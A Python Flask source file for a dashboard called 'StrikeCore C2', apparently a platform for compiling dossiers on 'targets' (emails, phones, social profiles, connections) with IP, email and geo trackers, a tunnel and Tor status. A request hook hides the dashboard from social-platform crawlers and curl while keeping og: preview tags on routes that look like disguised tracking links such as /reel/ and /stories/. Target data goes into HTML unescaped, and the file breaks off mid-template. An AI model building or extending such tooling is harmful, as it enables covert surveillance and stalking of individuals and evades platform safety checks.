"""
StrikeCore C2 Dashboard — Command & Control Intelligence Platform.

Modern glassmorphism UI with:
- Task dispatch and monitoring
- Sub-agent status + performance tracking
- Infrastructure health monitoring
- Investigation management
- Interactive maps, graphs, timelines
"""
from __future__ import annotations
import json, os, re, shutil, socket, subprocess, sys, time, psutil
from datetime import datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from flask import Flask, jsonify, request, send_file, abort, Response
from core.investigation_store import InvestigationStore, STORE_DIR

app = Flask(__name__)

# Trust proxy headers from cloudflared/nginx
try:
    from werkzeug.middleware.proxy_fix import ProxyFix
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=2, x_proto=1, x_host=1, x_prefix=1)
except ImportError:
    pass


def _get_real_ip():
    """Extract the real client IP, handling cloudflared/nginx/proxy headers."""
    # Priority: Cf-Connecting-Ip (cloudflared) > X-Forwarded-For > X-Real-IP > remote_addr
    ip = (request.headers.get("Cf-Connecting-Ip") or
          request.headers.get("X-Forwarded-For") or
          request.headers.get("X-Real-IP") or
          request.remote_addr or "unknown")
    # X-Forwarded-For can be comma-separated: take first (real client)
    if "," in ip:
        ip = ip.split(",")[0].strip()
    # Filter out localhost/loopback
    if ip in ("127.0.0.1", "::1", "localhost"):
        # Check if there's another header with real IP
        for h in ["Cf-Connecting-Ip", "X-Forwarded-For", "X-Real-Ip", "True-Client-Ip"]:
            val = request.headers.get(h, "")
            if val and val not in ("127.0.0.1", "::1"):
                ip = val.split(",")[0].strip()
                break
    return ip
REPORTS_DIR = Path.home() / "strikecore-data" / "reports"
GRAPHS_DIR = REPORTS_DIR / "graphs"
PERF_FILE = Path.home() / ".strikecore" / "tool_performance.json"
AUDIT_DIR = Path.home() / ".strikecore" / "audit"
_HEPH_RUNS_DIR = Path.home() / ".strikecore" / "hephaestus" / "runs"

# Fix PATH for tool detection
_extra = [str(Path.home() / ".local" / "bin"), str(Path.home() / "go" / "bin"), "/usr/local/go/bin"]
_path = os.environ.get("PATH", "")
for p in _extra:
    if p not in _path:
        _path = p + ":" + _path
os.environ["PATH"] = _path

# ══════════════════════════════════════════════════════════════
# HTML Templates
# ══════════════════════════════════════════════════════════════

BASE_HEAD = '''<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta property="og:title" content="Page">
<meta property="og:description" content="">
<meta property="og:image" content="">
<title>StrikeCore C2</title>
<script src="https://cdn.tailwindcss.com"></script>

<script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
html{font-family:'Inter',system-ui,sans-serif}
body{background:#030712;color:#d1d5db;min-height:100vh}
code,pre,.font-mono{font-family:'JetBrains Mono',monospace}
.sidebar{width:256px;min-height:100vh;position:fixed;left:0;top:0;z-index:40;
  background:#030712;border-right:1px solid #1f2937;display:flex;flex-direction:column}
.main{margin-left:256px;min-height:100vh}
.glass{background:#0d131e;border:1px solid #1f2937;border-radius:8px}
.glass-bright{background:#0d131e;border:1px solid #1f2937;border-radius:8px}
.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:9999px;font-size:11px;font-weight:500}
.stat-num{font-size:1.75rem;font-weight:700;line-height:1;letter-spacing:-0.02em}
.table-row:hover{background:rgba(255,255,255,0.02)}
.glow-red{box-shadow:0 0 12px rgba(239,68,68,0.12)}
.glow-cyan{box-shadow:0 0 12px rgba(6,182,212,0.12)}
.glow-green{box-shadow:0 0 12px rgba(16,185,129,0.12)}
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
.tab-btn{padding:8px 16px;font-size:12px;font-weight:500;color:#6b7280;
  border-bottom:2px solid transparent;cursor:pointer;transition:all 0.15s}
.tab-btn:hover{color:#d1d5db}
.tab-btn.active{color:#10b981;border-bottom-color:#10b981}
.tab-content{display:none}.tab-content.active{display:block}
.dialpad-btn{width:60px;height:50px;display:flex;flex-direction:column;align-items:center;justify-content:center;
  border-radius:8px;background:#111827;border:1px solid #1f2937;
  cursor:pointer;transition:all 0.15s;font-size:18px;color:#fff;font-weight:500}
.dialpad-btn:hover{background:#1f2937}
.dialpad-btn:active{background:rgba(16,185,129,0.15);transform:scale(0.95)}
.dialpad-btn small{font-size:8px;color:#6b7280;margin-top:1px}
.nav-item{display:flex;align-items:center;gap:10px;padding:7px 12px;border-radius:6px;
  font-size:13px;color:#9ca3af;transition:all 0.15s;text-decoration:none}
.nav-item:hover{background:#111827;color:#e5e7eb}
.nav-item.active{background:#111827;color:#ffffff}
.nav-section{padding:0 12px;margin-bottom:4px;margin-top:20px;font-size:10px;
  font-weight:600;color:#4b5563;text-transform:uppercase;letter-spacing:0.1em}
.nav-sub{padding-left:34px;font-size:12px;color:#6b7280}
.nav-sub:hover{color:#9ca3af}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:#030712}
::-webkit-scrollbar-thumb{background:#1f2937;border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:#374151}
</style></head>'''

SIDEBAR = '''<body>
<div class="sidebar">
  <div class="p-5 border-b border-gray-800 shrink-0">
    <div class="flex items-center gap-2.5">
      <div class="w-7 h-7 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
        <span class="text-emerald-400 text-sm font-bold">S</span>
      </div>
      <div>
        <span class="text-white font-semibold text-sm tracking-wide">StrikeCore</span>
        <div class="text-[10px] text-gray-500">C2 Platform</div>
      </div>
    </div>
  </div>

  <nav class="flex-1 overflow-y-auto px-3 py-4 space-y-0.5">
    <a href="/" class="nav-item %(active_home)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6A2.25 2.25 0 016 3.75h2.25A2.25 2.25 0 0110.5 6v2.25a2.25 2.25 0 01-2.25 2.25H6a2.25 2.25 0 01-2.25-2.25V6zM3.75 15.75A2.25 2.25 0 016 13.5h2.25a2.25 2.25 0 012.25 2.25V18a2.25 2.25 0 01-2.25 2.25H6A2.25 2.25 0 013.75 18v-2.25zM13.5 6a2.25 2.25 0 012.25-2.25H18A2.25 2.25 0 0120.25 6v2.25A2.25 2.25 0 0118 10.5h-2.25a2.25 2.25 0 01-2.25-2.25V6zM13.5 15.75a2.25 2.25 0 012.25-2.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-2.25a2.25 2.25 0 01-2.25-2.25v-2.25z"/></svg>
      Dashboard</a>
    <a href="/investigations" class="nav-item %(active_inv)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"/></svg>
      Investigations</a>
    <a href="/agents" class="nav-item %(active_agents)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8.25 3v1.5M4.5 8.25H3m18 0h-1.5M4.5 12H3m18 0h-1.5m-15 3.75H3m18 0h-1.5M8.25 19.5V21M12 3v1.5m0 15V21m3.75-18v1.5m0 15V21m-9-1.5h10.5a2.25 2.25 0 002.25-2.25V6.75a2.25 2.25 0 00-2.25-2.25H6.75A2.25 2.25 0 004.5 6.75v10.5a2.25 2.25 0 002.25 2.25z"/></svg>
      Agents</a>
    <a href="/geoint" class="nav-item %(active_geoint)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 21a9.004 9.004 0 008.716-6.747M12 21a9.004 9.004 0 01-8.716-6.747M12 21c2.485 0 4.5-4.03 4.5-9S14.485 3 12 3m0 18c-2.485 0-4.5-4.03-4.5-9S9.515 3 12 3m0 0a8.997 8.997 0 017.843 4.582M12 3a8.997 8.997 0 00-7.843 4.582m15.686 0A11.953 11.953 0 0112 10.5c-2.998 0-5.74-1.1-7.843-2.918m15.686 0A8.959 8.959 0 0121 12c0 .778-.099 1.533-.284 2.253m0 0A17.919 17.919 0 0112 16.5a17.92 17.92 0 01-8.716-2.247m0 0A9.015 9.015 0 013 12c0-1.605.42-3.113 1.157-4.418"/></svg>
      GEOINT</a>
    <div class="nav-section" style="margin-top:24px">Toolsmith</div>
    <a href="/hephaestus" class="nav-item %(active_hephaestus)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M11.42 15.17L17.25 21A2.652 2.652 0 0021 17.25l-5.877-5.877M11.42 15.17l2.496-3.03c.317-.384.74-.626 1.208-.766M11.42 15.17l-4.655 5.653a2.548 2.548 0 11-3.586-3.586l6.837-5.63m5.108-.233c.55-.164 1.163-.188 1.743-.14a4.5 4.5 0 004.486-6.336l-3.276 3.277a3.004 3.004 0 01-2.25-2.25l3.276-3.276a4.5 4.5 0 00-6.336 4.486c.091 1.076-.071 2.264-.904 2.95l-.102.085m-1.745 1.437L5.909 7.5H4.5L2.25 3.75l1.5-1.5L7.5 4.5v1.409l4.26 4.26m-1.745 1.437l1.745-1.437m6.615 8.206L15.75 15.75M4.867 19.125h.008v.008h-.008v-.008z"/></svg>
      Hephaestus</a>
    <a href="/control-room" class="nav-item %(active_control_room)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 3v11.25A2.25 2.25 0 006 16.5h2.25M3.75 3h-1.5m1.5 0h16.5m0 0h1.5m-1.5 0v11.25A2.25 2.25 0 0118 16.5h-2.25m-7.5 0h7.5m-7.5 0l-1 3m8.5-3l1 3m0 0l.5 1.5m-.5-1.5h-9.5m0 0l-.5 1.5M9 11.25v1.5M12 9v3.75m3-6v6"/></svg>
      Control Room</a>

    <div class="nav-section" style="margin-top:24px">Gateway Telefonico</div>
    <a href="/voip" class="nav-item %(active_voip)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.38a12.035 12.035 0 01-7.143-7.143c-.162-.441.004-.928.38-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 00-1.091-.852H4.5A2.25 2.25 0 002.25 4.5v2.25z"/></svg>
      Gateway</a>
    <a href="/voip#rubrica" class="nav-item nav-sub">Rubrica</a>
    <a href="/voip#dialpad" class="nav-item nav-sub">Pulsantiera</a>
    <a href="/voip#tracker" class="nav-item nav-sub">IP Tracker</a>
    <a href="/voip#geo" class="nav-item nav-sub">Geo Tracker</a>

    <div class="nav-section">Tracking</div>
    <a href="/tracking" class="nav-item %(active_tracking)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z"/></svg>
      IP Tracker</a>
    <a href="/email-tracker" class="nav-item %(active_email)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75"/></svg>
      Email Tracker</a>
    <a href="/tunnel" class="nav-item %(active_tunnel)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 15a4.5 4.5 0 004.5 4.5H18a3.75 3.75 0 001.332-7.257 3 3 0 00-3.758-3.848 5.25 5.25 0 00-10.233 2.33A4.502 4.502 0 002.25 15z"/></svg>
      Tunnel</a>

    <div class="nav-section">Platform</div>
    <a href="/infrastructure" class="nav-item %(active_infra)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5.25 14.25h13.5m-13.5 0a3 3 0 01-3-3m3 3a3 3 0 100 6h13.5a3 3 0 100-6m-16.5-3a3 3 0 013-3h13.5a3 3 0 013 3m-19.5 0a4.5 4.5 0 01.9-2.7L5.737 5.1a3.375 3.375 0 012.7-1.35h7.126c1.062 0 2.062.5 2.7 1.35l2.587 3.45a4.5 4.5 0 01.9 2.7m0 0a3 3 0 01-3 3m0 3h.008v.008h-.008v-.008zm0-6h.008v.008h-.008v-.008zm-3 6h.008v.008h-.008v-.008zm0-6h.008v.008H15v-.008z"/></svg>
      Infrastructure</a>
    <a href="/tasks" class="nav-item %(active_tasks)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5.25 5.653c0-.856.917-1.398 1.667-.986l11.54 6.348a1.125 1.125 0 010 1.971l-11.54 6.347a1.125 1.125 0 01-1.667-.985V5.653z"/></svg>
      Tasks</a>
    <a href="/db" class="nav-item %(active_db)s">
      <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125"/></svg>
      Database</a>
  </nav>

  <div class="px-4 py-3 border-t border-gray-800 space-y-1.5 shrink-0 text-[11px]">
    <div class="flex items-center gap-2">
      <span class="w-1.5 h-1.5 rounded-full %(tor_color)s"></span>
      <span class="text-gray-500">Tor: %(tor_status)s</span>
    </div>
    <div class="flex items-center gap-2">
      <span class="w-1.5 h-1.5 rounded-full %(ai_color)s"></span>
      <span class="text-gray-500">AI: %(ai_status)s</span>
    </div>
    <div class="flex items-center gap-2">
      <span class="w-1.5 h-1.5 rounded-full bg-gray-600"></span>
      <span class="text-gray-500">Up: %(uptime)s</span>
    </div>
  </div>
</div>
<div class="main">
  <div class="border-b border-gray-800 px-6 h-14 flex items-center shrink-0">
    <span class="text-sm font-medium text-gray-200"></span>
  </div>
  <div class="p-6">'''

FOOTER = '</div></div></body></html>'


def _system_status():
    """Get live system status for sidebar."""
    tor_ok = False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("127.0.0.1", 9050))
        s.close()
        tor_ok = True
    except:
        pass

    # Detect active AI provider from config
    ai_provider = "unknown"
    ai_model = ""
    try:
        from config.settings import get_settings
        s = get_settings()
        ai_provider = s.get("ai.active_provider", "unknown")
        if ai_provider == "anthropic":
            ai_model = s.get("ai.anthropic.model", "claude")
        elif ai_provider == "ollama":
            ai_model = s.get("ai.ollama.model", "local")
        elif ai_provider == "custom":
            ai_model = s.get("ai.custom.model", "custom")
        elif ai_provider == "openrouter":
            ai_model = s.get("ai.openrouter.model", "openrouter")
    except:
        pass

    ai_short = ai_model.split("/")[-1].split("-")[0] if ai_model else ai_provider
    ai_label = f"{ai_provider}: {ai_short}"

    try:
        uptime_s = time.time() - psutil.boot_time()
        days = int(uptime_s // 86400)
        hours = int((uptime_s % 86400) // 3600)
        uptime = f"{days}d {hours}h"
    except:
        uptime = "N/A"

    return {
        "tor_status": "ACTIVE" if tor_ok else "DOWN",
        "tor_color": "text-green-400" if tor_ok else "text-red-400",
        "ai_status": ai_label,
        "ai_color": "text-cyan-400" if ai_provider != "unknown" else "text-red-400",
        "uptime": uptime,
    }


def _render(title, content, active=""):
    """Render page with sidebar and system status."""
    status = _system_status()
    _a = lambda key: "bg-white/10 text-white" if active == key else ""
    sidebar = SIDEBAR % {
        "active_home": _a("home"),
        "active_inv": _a("inv"),
        "active_agents": _a("agents"),
        "active_infra": _a("infra"),
        "active_tasks": _a("tasks"),
        "active_db": _a("db"),
        "active_geoint": _a("geoint"),
        "active_tracking": _a("tracking"),
        "active_email": _a("email"),
        "active_tunnel": _a("tunnel"),
        "active_voip": _a("voip"),
        "active_hephaestus": _a("hephaestus"),
        "active_control_room": _a("control_room"),
        **status,
    }
    return Response(
        BASE_HEAD + sidebar + content + FOOTER,
        mimetype='text/html'
    )


# ══════════════════════════════════════════════════════════════
# Routes
# ══════════════════════════════════════════════════════════════

@app.before_request
def _cloak_for_crawlers():
    """Serve a blank page to crawlers hitting non-tracking routes.

    Prevents social platform crawlers from caching 'StrikeCore' or dashboard
    content when they crawl the tunnel domain root or other dashboard pages.
    Tracking routes (/reel/, /lp/, /gl/, /og/, /p/, /t/, /c/, /s/) are excluded
    so their og: tags are correctly served to crawlers.
    """
    ua = request.headers.get("User-Agent", "").lower()
    crawlers = ["facebookexternalhit", "facebot", "twitterbot", "telegrambot",
                "whatsapp", "linkedinbot", "slackbot", "discordbot", "bot", "crawler",
                "preview", "spider", "curl"]
    path = request.path
    tracking_prefixes = ("/reel/", "/reels/", "/lp/", "/gl/", "/og/", "/p/", "/t/", "/c/", "/s/", "/stories/", "/api/", "/ui/", "/_nuxt/")
    if any(c in ua for c in crawlers) and not any(path.startswith(p) for p in tracking_prefixes):
        return Response("<!DOCTYPE html><html><head><meta name='robots' content='noindex'><title>Page</title></head><body></body></html>",
                        mimetype="text/html")


@app.route('/')
def index():
    """C2 Dashboard — Overview with stats and recent activity."""
    # Gather stats
    inv_count = len(list(STORE_DIR.glob("*.json"))) if STORE_DIR.exists() else 0
    total_emails = total_phones = total_profiles = total_connections = 0
    investigations = []

    if STORE_DIR.exists():
        for f in sorted(STORE_DIR.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True):
            try:
                d = json.loads(f.read_text())
                ne = len(d.get("emails", {}))
                np_ = len(d.get("phones", {}))
                npro = len(d.get("profiles", {}))
                nc = len(d.get("social_graph", []))
                total_emails += ne
                total_phones += np_
                total_profiles += npro
                total_connections += nc
                investigations.append({
                    "id": f.stem,
                    "name": (d.get("identity", {}).get("names", []) or [f.stem])[0],
                    "emails": ne, "phones": np_, "profiles": npro, "connections": nc,
                    "updated": d.get("updated", "")[:16],
                })
            except:
                pass

    # Tool performance
    tool_count = 0
    avg_rate = 0
    if PERF_FILE.exists():
        try:
            perf = json.loads(PERF_FILE.read_text())
            rates = [v.get("lifetime_success_rate", 0) for k, v in perf.items() if not k.startswith("_")]
            tool_count = len(rates)
            avg_rate = sum(rates) / len(rates) * 100 if rates else 0
        except:
            pass

    # System health
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = shutil.disk_usage("/")
    except:
        cpu = 0
        mem = type('obj', (object,), {'percent': 0, 'used': 0, 'total': 1})()
        disk = type('obj', (object,), {'used': 0, 'total': 1, 'free': 0})()

    # Recent investigations table
    inv_rows = ""
    for inv in investigations[:8]:
        inv_rows += f'''<tr class="table-row border-b border-white/5">
            <td class="py-2 px-3"><a href="/target/{inv['id']}" class="text-cyan-400 hover:text-cyan-300">{inv['name']}</a></td>
            <td class="py-2 px-3 text-blue-400">{inv['emails']}</td>
            <td class="py-2 px-3 text-purple-400">{inv['phones']}</td>
            <td class="py-2 px-3 text-green-400">{inv['profiles']}</td>
            <td class="py-2 px-3 text-pink-400">{inv['connections']}</td>
            <td class="py-2 px-3 text-gray-500 text-[10px]">{inv['updated']}</td>
        </tr>'''

    content = f'''
    <div class="flex items-center justify-between mb-6">
      <div><h1 class="text-xl font-bold text-white">Command Center</h1>
        <p class="text-xs text-gray-500">{datetime.now().strftime("%Y-%m-%d %H:%M")} UTC</p></div>
      <a href="/tracking" class="block px-3 py-2 rounded-lg hover:bg-white/5 text-gray-300 hover:text-white">
      <span class="mr-2">&#127919;</span> IP Tracking</a>
    <a href="/email-tracker" class="block px-3 py-2 rounded-lg hover:bg-white/5 text-gray-300 hover:text-white">
      <span class="mr-2">&#9993;</span> Email Tracker</a>
    <a href="/geoint" class="block px-3 py-2 rounded-lg hover:bg-white/5 text-gray-300 hover:text-white">
      <span class="mr-2">&#127758;</span> GEOINT</a>
    <a href="/tasks" class="px-4 py-2 bg-red-500/20 border border-red-500/30 rounded-lg text-red-400 text-xs hover:bg-red-500/30">
        + New Task</a>
    </div>

    <!-- Stats Grid -->
    <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3 mb-6">
      <div class="glass p-4 glow-cyan"><div class="text-[10px] text-gray-400 uppercase mb-1">Investigations</div><div class="stat-num text-cyan-400">{inv_count}</div></div>
      <div class="glass p-4"><div class="text-[10px] text-gray-400 uppercase mb-1">Emails Found</div><div class="stat-num text-blue-400">{total_emails}</div></div>
      <div class="glass p-4"><div class="text-[10px] text-gray-400 uppercase mb-1">Phones Found</div><div class="stat-num text-purple-400">{total_phones}</div></div>
      <div class="glass p-4"><div class="text-[10px] text-gray-400 uppercase mb-1">Profiles</div><div class="stat-num text-green-400">{total_profiles}</div></div>
      <div class="glass p-4"><div class="text-[10px] text-gray-400 uppercase mb-1">Connections</div><div class="stat-num text-pink-400">{total_connections}</div></div>
      <div class="glass p-4"><div class="text-[10px] text-gray-400 uppercase mb-1">Tool Success</div><div class="stat-num text-yellow-400">{avg_rate:.0f}%</div></div>
    </div>

    <!-- System Health Bar -->
    <div class="grid grid-cols-3 gap-3 mb-6">
      <div class="glass p-3 flex items-center gap-3">
        <div class="text-xs text-gray-400">CPU</div>
        <div class="flex-1 bg-gray-800 rounded-full h-2"><div class="bg-cyan-500 h-2 rounded-full" style="width:{cpu}%"></div></div>
        <div class="text-xs text-cyan-400">{cpu:.0f}%</div>
      </div>
      <div class="glass p-3 flex items-center gap-3">
        <div class="text-xs text-gray-400">RAM</div>
        <div class="flex-1 bg-gray-800 rounded-full h-2"><div class="bg-purple-500 h-2 rounded-full" style="width:{mem.percent}%"></div></div>
        <div class="text-xs text-purple-400">{mem.percent:.0f}%</div>
      </div>
      <div class="glass p-3 flex items-center gap-3">
        <div class="text-xs text-gray-400">Disk</div>
        <div class="flex-1 bg-gray-800 rounded-full h-2"><div class="bg-yellow-500 h-2 rounded-full" style="width:{disk.used/disk.total*100:.0f}%"></div></div>
        <div class="text-xs text-yellow-400">{disk.free/1024**3:.0f}GB free</div>
      </div>
    </div>

    <!-- Recent Investigations -->
    <div class="glass-bright p-5 mb-6">
      <h2 class="text-sm font-semibold text-white mb-3">Recent Investigations</h2>
      <table class="w-full text-xs">
        <thead><tr class="text-gray-500 border-b border-white/10">
          <th class="text-left py-2 px-3">Target</th><th class="py-2 px-3">Emails</th><th class="py-2 px-3">Phones</th>
          <th class="py-2 px-3">Profiles</th><th class="py-2 px-3">Connections</th><th class="py-2 px-3">Updated</th>
        </tr></thead>
        <tbody>{inv_rows}</tbody>
      </table>
    </div>
    '''

    return _render("Dashboard", content, "home")


@app.route('/investigations')
def investigations():
    """List all investigations with management options."""
    rows = ""
    if STORE_DIR.exists():
        for f in sorted(STORE_DIR.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True):
            try:
                d = json.loads(f.read_text())
                name = (d.get("identity", {}).get("names", []) or [f.stem])[0]
                ne = len(d.get("emails", {}))
                np_ = len(d.get("phones", {}))
                npro = len(d.get("profiles", {}))
                nc = len(d.get("social_graph", []))
                updated = d.get("updated", "")[:16]
                phases = len(d.get("phase_log", []))
                rows += f'''<tr class="table-row border-b border-white/5">
                  <td class="py-3 px-4"><a href="/target/{f.stem}" class="text-cyan-400 hover:text-cyan-300 font-medium">{name}</a>
                    <div class="text-[10px] text-gray-600">{f.stem}</div></td>
                  <td class="py-3 px-4 text-center"><span class="badge bg-blue-500/20 text-blue-400">{ne}</span></td>
                  <td class="py-3 px-4 text-center"><span class="badge bg-purple-500/20 text-purple-400">{np_}</span></td>
                  <td class="py-3 px-4 text-center"><span class="badge bg-green-500/20 text-green-400">{npro}</span></td>
                  <td class="py-3 px-4 text-center"><span class="badge bg-pink-500/20 text-pink-400">{nc}</span></td>
                  <td class="py-3 px-4 text-center text-gray-500">{phases}</td>
                  <td class="py-3 px-4 text-[10px] text-gray-500">{updated}</td>
                  <td class="py-3 px-4 text-right">
                    <a href="/target/{f.stem}" class="text-cyan-500 hover:text-cyan-300 text-[10px] mr-2">View</a>
                    <a href="/target/{f.stem}/manage" class="text-yellow-500 hover:text-yellow-300 text-[10px] mr-2">Manage</a>
                    <a href="/target/{f.stem}/map" class="text-green-500 hover:text-green-300 text-[10px]">Map</a>
                  </td>
                </tr>'''
            except:
                pass

    content = f'''
    <div class="flex items-center justify-between mb-6">
      <h1 class="text-xl font-bold text-white">Investigations</h1>
    </div>
    <div class="glass-bright p-5">
      <table class="w-full text-xs">
        <thead><tr class="text-gray-500 border-b border-white/10">
          <th class="text-left py-2 px-4">Target</th><th class="py-2 px-4">Emails</th><th class="py-2 px-4">Phones</th>
          <th class="py-2 px-4">Profiles</th><th class="py-2 px-4">Links</th><th class="py-2 px-4">Phases</th>
          <th class="py-2 px-4">Updated</th><th class="py-2 px-4"></th>
        </tr></thead>
        <tbody>{rows}</tbody>
      </table>
    </div>'''

    return _render("Investigations", content, "inv")


@app.route('/target/<tid>')
def target_view(tid):
    """Target detail page — glassmorphism cards."""
    store = InvestigationStore(tid)
    d = store.data
    name = (d["identity"]["names"] or [tid])[0]
    usernames = ", ".join(d["identity"].get("usernames", []))

    has_graph = (GRAPHS_DIR / f"{tid}_graph.html").exists()
    has_report = (REPORTS_DIR / f"{tid}_report.html").exists()

    # Email cards
    email_rows = ""
    for email, info in d.get("emails", {}).items():
        conf = info.get("confidence", "PROBABLE")
        score = info.get("confidence_score", "")
        conf_color = "green" if conf == "CONFIRMED" else ("yellow" if conf == "PROBABLE" else "red")
        email_rows += f'''<div class="flex items-center justify-between py-2 px-3 border-b border-white/5 table-row">
          <code class="text-blue-300 text-[11px]">{email}</code>
          <div class="flex items-center gap-2">
            <span class="badge bg-{conf_color}-500/20 text-{conf_color}-400">{conf}</span>
            {"<span class='text-[10px] text-gray-500'>"+str(score)+"</span>" if score else ""}
          </div>
        </div>'''

    # Phone cards
    phone_rows = ""
    for phone, info in d.get("phones", {}).items():
        carrier = info.get("carrier", "")
        phone_rows += f'''<div class="flex items-center justify-between py-2 px-3 border-b border-white/5 table-row">
          <code class="text-purple-300 text-[11px]">{phone}</code>
          <span class="text-[10px] text-gray-400">{carrier}</span>
        </div>'''

    # Profile cards
    profile_rows = ""
    for plat, info in d.get("profiles", {}).items():
        profile_rows += f'''<div class="flex items-center justify-between py-2 px-3 border-b border-white/5 table-row">
          <div><span class="text-green-400 font-medium text-xs">{plat}</span>
            <a href="{info.get('url','')}" target="_blank" class="block text-[10px] text-gray-500 hover:text-cyan-400">{info.get('url','')[:50]}</a></div>
          <span class="badge bg-green-500/20 text-green-400">{info.get('confidence','')}</span>
        </div>'''

    # Connection cards
    conn_rows = ""
    for c in d.get("social_graph", [])[:15]:
        conn_rows += f'''<div class="flex items-center justify-between py-2 px-3 border-b border-white/5 table-row">
          <span class="text-pink-300 text-xs">{c.get('name','')}</span>
          <span class="text-[10px] text-gray-500">{c.get('relation','')}</span>
        </div>'''

    # Action buttons
    actions = f'''
    <div class="flex flex-wrap gap-2 mb-6">
      <a href="/target/{tid}/manage" class="px-3 py-1.5 glass text-yellow-400 text-xs hover:bg-white/5 border-yellow-500/20">Manage Data</a>
      <a href="/target/{tid}/photomap" class="px-3 py-1.5 glass text-pink-400 text-xs hover:bg-white/5 border-pink-500/20">Photo Map</a>
      <a href="/target/{tid}/map" class="px-3 py-1.5 glass text-cyan-400 text-xs hover:bg-white/5 border-cyan-500/20">GeoMap</a>
      <a href="/target/{tid}/timeline" class="px-3 py-1.5 glass text-yellow-300 text-xs hover:bg-white/5 border-yellow-300/20">Timeline</a>
      {"<a href='/target/"+tid+"/graph' class='px-3 py-1.5 glass text-green-400 text-xs hover:bg-white/5 border-green-500/20'>Graph</a>" if has_graph else ""}
      {"<a href='/target/"+tid+"/report' class='px-3 py-1.5 glass text-white text-xs hover:bg-white/5' target='_blank'>Report</a>" if has_report else ""}
    </div>'''

    content = f'''
    <div class="mb-4">
      <h1 class="text-xl font-bold text-white">{name}</h1>
